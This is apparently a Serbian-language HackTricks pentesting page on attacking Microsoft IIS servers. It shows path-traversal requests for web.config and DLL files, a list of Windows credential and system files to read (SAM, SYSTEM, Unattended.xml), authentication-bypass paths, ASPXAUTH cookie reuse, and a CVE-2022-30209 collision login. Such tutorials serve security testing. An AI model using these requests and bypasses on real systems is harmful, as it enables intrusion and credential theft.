# IIS - Internet Information Services

<details>

<summary><strong>Nauƒçite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naƒçini podr≈°ke HackTricks-u:

* Ako ≈æelite da vidite **va≈°u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniƒçni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), na≈°u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru≈æite se** üí¨ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

Testirajte ekstenzije izvr≈°nih datoteka:

* asp
* aspx
* config
* php

## Otkrivanje interne IP adrese

Na bilo kom IIS serveru gde dobijete 302, mo≈æete poku≈°ati da uklonite zaglavlje Host i koristite HTTP/1.0, a unutar odgovora, zaglavlje Lokacija bi moglo da vas usmeri ka internoj IP adresi:
```
nc -v domain.com 80
openssl s_client -connect domain.com:443
```
Odgovor koji otkriva internu IP adresu:
```
GET / HTTP/1.0

HTTP/1.1 302 Moved Temporarily
Cache-Control: no-cache
Pragma: no-cache
Location: https://192.168.5.237/owa/
Server: Microsoft-IIS/10.0
X-FEServer: NHEXCHANGE2016
```
## Izvr≈°avanje .config fajlova

Mo≈æete otpremiti .config fajlove i koristiti ih za izvr≈°avanje koda. Jedan naƒçin je dodavanje koda na kraj fajla unutar HTML komentara: [Preuzmite primer ovde](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config)

Vi≈°e informacija i tehnike za iskori≈°ƒáavanje ove ranjivosti [ovde](https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/)

## IIS Otkrivanje Brute Force

Preuzmite listu koju sam kreirao:

{% file src="../../.gitbook/assets/iisfinal.txt" %}

Kreirana je spajanjem sadr≈æaja sledeƒáih lista:

[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt)\
[http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html](http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html)\
[https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt](https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt)\
[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt)\
[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt)\
[https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt](https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt)

Koristite je bez dodavanja bilo kakvog nastavka, fajlovi koji ga zahtevaju veƒá ga imaju.

## Traversiranje Putanje

### Otkrivanje izvornog koda

Proverite kompletan opis u: [https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html](https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html)

{% hint style="info" %}
Kao sa≈æetak, postoji nekoliko web.config fajlova unutar foldera aplikacije sa referencama na "**assemblyIdentity**" fajlove i "**namespaces**". Sa ovim informacijama je moguƒáe znati **gde se nalaze izvr≈°ni fajlovi** i preuzeti ih.\
Iz **preuzetih Dll fajlova** takoƒëe je moguƒáe pronaƒái **nove namespaces** gde biste trebali poku≈°ati pristupiti i dobiti web.config fajl kako biste prona≈°li nove namespaces i assemblyIdentity.\
Takoƒëe, fajlovi **connectionstrings.config** i **global.asax** mogu sadr≈æati zanimljive informacije.\\
{% endhint %}

U **.Net MVC aplikacijama**, fajl **web.config** igra kljuƒçnu ulogu specificiranjem svakog binarnog fajla na koji se aplikacija oslanja putem **"assemblyIdentity"** XML tagova.

### **Istra≈æivanje Binarnih Fajlova**

Primer pristupa fajlu **web.config** je prikazan ispod:
```markup
GET /download_page?id=..%2f..%2fweb.config HTTP/1.1
Host: example-mvc-application.minded
```
Ovaj zahtev otkriva razliƒçite postavke i zavisnosti, kao ≈°to su:

* Verzija **EntityFramework**-a
* **AppSettings** za web stranice, klijentsku validaciju i JavaScript
* Konfiguracije **System.web** za autentifikaciju i runtime
* Postavke modula **System.webServer**
* Veze sklopova za izvr≈°avanje za brojne biblioteke poput **Microsoft.Owin**, **Newtonsoft.Json** i **System.Web.Mvc**

Ove postavke ukazuju da se odreƒëene datoteke, poput **/bin/WebGrease.dll**, nalaze unutar fascikle aplikacije /bin.

### **Datoteke u korenskom direktorijumu**

Datoteke pronaƒëene u korenskom direktorijumu, poput **/global.asax** i **/connectionstrings.config** (koji sadr≈æi osetljive lozinke), su kljuƒçne za konfiguraciju i rad aplikacije.

### **Prostori imena i Web.Config**

MVC aplikacije takoƒëe defini≈°u dodatne **web.config datoteke** za specifiƒçne prostore imena kako bi se izbegla ponovna deklaracija u svakoj datoteci, kao ≈°to je prikazano zahtevom za preuzimanje druge **web.config** datoteke:
```markup
GET /download_page?id=..%2f..%2fViews/web.config HTTP/1.1
Host: example-mvc-application.minded
```
### **Preuzimanje DLL-ova**

Pomen o prilagoƒëenom imenskom prostoru ukazuje na DLL nazvan "**WebApplication1**" koji se nalazi u /bin direktorijumu. Nakon toga, prikazan je zahtev za preuzimanje **WebApplication1.dll** fajla:
```markup
GET /download_page?id=..%2f..%2fbin/WebApplication1.dll HTTP/1.1
Host: example-mvc-application.minded
```
Ovo ukazuje na prisustvo drugih bitnih DLL-ova, poput **System.Web.Mvc.dll** i **System.Web.Optimization.dll**, u /bin direktorijumu.

U scenariju gde DLL uvozi prostor imena nazvan **WebApplication1.Areas.Minded**, napadaƒç mo≈æe zakljuƒçiti postojanje drugih web.config fajlova na predvidljivim putanjama, poput **/ime-oblasti/Views/**, koji sadr≈æe specifiƒçne konfiguracije i reference ka drugim DLL-ovima u /bin folderu. Na primer, zahtev za **/Minded/Views/web.config** mo≈æe otkriti konfiguracije i prostore imena koji ukazuju na prisustvo jo≈° jednog DLL-a, **WebApplication1.AdditionalFeatures.dll**.

### Zajedniƒçki fajlovi

Sa [ovde](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
```
C:\Apache\conf\httpd.conf
C:\Apache\logs\access.log
C:\Apache\logs\error.log
C:\Apache2\conf\httpd.conf
C:\Apache2\logs\access.log
C:\Apache2\logs\error.log
C:\Apache22\conf\httpd.conf
C:\Apache22\logs\access.log
C:\Apache22\logs\error.log
C:\Apache24\conf\httpd.conf
C:\Apache24\logs\access.log
C:\Apache24\logs\error.log
C:\Documents and Settings\Administrator\NTUser.dat
C:\php\php.ini
C:\php4\php.ini
C:\php5\php.ini
C:\php7\php.ini
C:\Program Files (x86)\Apache Group\Apache\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache\logs\access.log
C:\Program Files (x86)\Apache Group\Apache\logs\error.log
C:\Program Files (x86)\Apache Group\Apache2\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache2\logs\access.log
C:\Program Files (x86)\Apache Group\Apache2\logs\error.log
c:\Program Files (x86)\php\php.ini"
C:\Program Files\Apache Group\Apache\conf\httpd.conf
C:\Program Files\Apache Group\Apache\conf\logs\access.log
C:\Program Files\Apache Group\Apache\conf\logs\error.log
C:\Program Files\Apache Group\Apache2\conf\httpd.conf
C:\Program Files\Apache Group\Apache2\conf\logs\access.log
C:\Program Files\Apache Group\Apache2\conf\logs\error.log
C:\Program Files\FileZilla Server\FileZilla Server.xml
C:\Program Files\MySQL\my.cnf
C:\Program Files\MySQL\my.ini
C:\Program Files\MySQL\MySQL Server 5.0\my.cnf
C:\Program Files\MySQL\MySQL Server 5.0\my.ini
C:\Program Files\MySQL\MySQL Server 5.1\my.cnf
C:\Program Files\MySQL\MySQL Server 5.1\my.ini
C:\Program Files\MySQL\MySQL Server 5.5\my.cnf
C:\Program Files\MySQL\MySQL Server 5.5\my.ini
C:\Program Files\MySQL\MySQL Server 5.6\my.cnf
C:\Program Files\MySQL\MySQL Server 5.6\my.ini
C:\Program Files\MySQL\MySQL Server 5.7\my.cnf
C:\Program Files\MySQL\MySQL Server 5.7\my.ini
C:\Program Files\php\php.ini
C:\Users\Administrator\NTUser.dat
C:\Windows\debug\NetSetup.LOG
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\php.ini
C:\Windows\repair\SAM
C:\Windows\repair\system
C:\Windows\System32\config\AppEvent.evt
C:\Windows\System32\config\RegBack\SAM
C:\Windows\System32\config\RegBack\system
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SecEvent.evt
C:\Windows\System32\config\SysEvent.evt
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\winevt\Logs\Application.evtx
C:\Windows\System32\winevt\Logs\Security.evtx
C:\Windows\System32\winevt\Logs\System.evtx
C:\Windows\win.ini
C:\xampp\apache\conf\extra\httpd-xampp.conf
C:\xampp\apache\conf\httpd.conf
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
C:\xampp\FileZillaFTP\FileZilla Server.xml
C:\xampp\MercuryMail\MERCURY.INI
C:\xampp\mysql\bin\my.ini
C:\xampp\php\php.ini
C:\xampp\security\webdav.htpasswd
C:\xampp\sendmail\sendmail.ini
C:\xampp\tomcat\conf\server.xml
```
## HTTPAPI 2.0 404 Gre≈°ka

Ako vidite gre≈°ku kao ≈°to je sledeƒáa:

![](<../../.gitbook/assets/image (446) (1) (2) (2) (3) (3) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (10) (2).png>)

To znaƒçi da server **nije primio taƒçno ime domena** unutar zaglavlja Host.\
Da biste pristupili veb stranici, mo≈æete pogledati poslu≈æeni **SSL sertifikat** i mo≈æda pronaƒái ime domena/poddomena tamo. Ako ga nema, mo≈æda ƒáete morati **bruteforce VHosts** dok ne pronaƒëete taƒçan.

## Stare ranjivosti IIS-a koje vredi istra≈æiti

### Microsoft IIS tilde karakter "\~" Ranjivost/Funkcija - Otkrivanje kratkog imena datoteke/foldera

Mo≈æete poku≈°ati **enumerisati foldere i datoteke** unutar svakog otkrivenog foldera (ƒçak i ako zahteva osnovnu autentifikaciju) koristeƒái ovu **tehniku**.\
Glavno ograniƒçenje ove tehnike ako je server ranjiv je da **mo≈æe pronaƒái samo do prvih 6 slova imena svake datoteke/foldera i prvih 3 slova ekstenzije** datoteka.

Mo≈æete koristiti [https://github.com/irsdl/IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner) da testirate ovu ranjivost:`java -jar iis_shortname_scanner.jar 2 20 http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db/`

![](<../../.gitbook/assets/image (841).png>)

Originalno istra≈æivanje: [https://soroush.secproject.com/downloadable/microsoft\_iis\_tilde\_character\_vulnerability\_feature.pdf](https://soroush.secproject.com/downloadable/microsoft\_iis\_tilde\_character\_vulnerability\_feature.pdf)

Takoƒëe mo≈æete koristiti **metasploit**: `use scanner/http/iis_shortname_scanner`

### Bypass osnovne autentifikacije

**Bypass** osnovne autentifikacije (**IIS 7.5**) poku≈°avajuƒái pristupiti: `/admin:$i30:$INDEX_ALLOCATION/admin.php` ili `/admin::$INDEX_ALLOCATION/admin.php`

Mo≈æete poku≈°ati **pome≈°ati** ovu **ranjivost** i prethodnu kako biste prona≈°li nove **foldere** i **bypass**-ovali autentifikaciju.

## ASP.NET Trace.AXD omoguƒáeno debagovanje

ASP.NET ukljuƒçuje re≈æim debagovanja, a njegova datoteka se zove `trace.axd`.

ƒåuva veoma detaljan zapis svih zahteva upuƒáenih aplikaciji tokom odreƒëenog vremenskog perioda.

Ove informacije ukljuƒçuju udaljene IP adrese klijenata, ID-ove sesija, sve kolaƒçiƒáe zahteva i odgovora, fiziƒçke putanje, informacije o izvornom kodu, a mo≈æda ƒçak i korisniƒçka imena i lozinke.

[https://www.rapid7.com/db/vulnerabilities/spider-asp-dot-net-trace-axd/](https://www.rapid7.com/db/vulnerabilities/spider-asp-dot-net-trace-axd/)

![Screenshot 2021-03-30 at 13 19 11](https://user-images.githubusercontent.com/31736688/112974448-2690b000-915b-11eb-896c-f41c27c44286.png)

## ASPXAUTH Kolaƒçiƒá

ASPXAUTH koristi sledeƒáe informacije:

* **`validationKey`** (string): heksadecimalni kljuƒç koji se koristi za validaciju potpisa.
* **`decryptionMethod`** (string): (podrazumevano "AES").
* **`decryptionIV`** (string): heksadecimalni inicijalizacioni vektor (podrazumevano vektor nula).
* **`decryptionKey`** (string): heksadecimalni kljuƒç koji se koristi za de≈°ifrovanje.

Meƒëutim, neki ljudi ƒáe koristiti **podrazumevane vrednosti** ovih parametara i koristiƒáe kao **kolaƒçiƒá email korisnika**. Stoga, ako pronaƒëete veb koji koristi **istu platformu** koja koristi ASPXAUTH kolaƒçiƒá i **kreirate korisnika sa emailom korisnika kog ≈æelite da predstavljate** na serveru pod napadom, mo≈æda ƒáete moƒái da koristite **kolaƒçiƒá sa drugog servera na prvom** i predstavljate korisnika.\
Ovaj napad je uspeo u ovom [**izve≈°taju**](https://infosecwriteups.com/how-i-hacked-facebook-part-two-ffab96d57b19).

## Bypass autentifikacije IIS-a sa ke≈°iranim lozinkama (CVE-2022-30209) <a href="#id-3-iis-authentication-bypass" id="id-3-iis-authentication-bypass"></a>

[Ceo izve≈°taj ovde](https://blog.orange.tw/2022/08/lets-dance-in-the-cache-destabilizing-hash-table-on-microsoft-iis.html): Gre≈°ka u kodu **nije pravilno proveravala lozinku koju je dao korisnik**, tako da ƒáe napadaƒç ƒçiji **hash lozinke pogodi kljuƒç** koji veƒá postoji u **ke≈°u** moƒái da se prijavi kao taj korisnik.
```python
# script for sanity check
> type test.py
def HashString(password):
j = 0
for c in map(ord, password):
j = c + (101*j)&0xffffffff
return j

assert HashString('test-for-CVE-2022-30209-auth-bypass') == HashString('ZeeiJT')

# before the successful login
> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
HTTP/1.1 401 Unauthorized

# after the successful login
> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
HTTP/1.1 200 OK
```
<details>

<summary><strong>Nauƒçite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naƒçini podr≈°ke HackTricks-u:

* Ako ≈æelite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJATELJSTVO**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniƒçni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), na≈°u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru≈æite se** üí¨ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
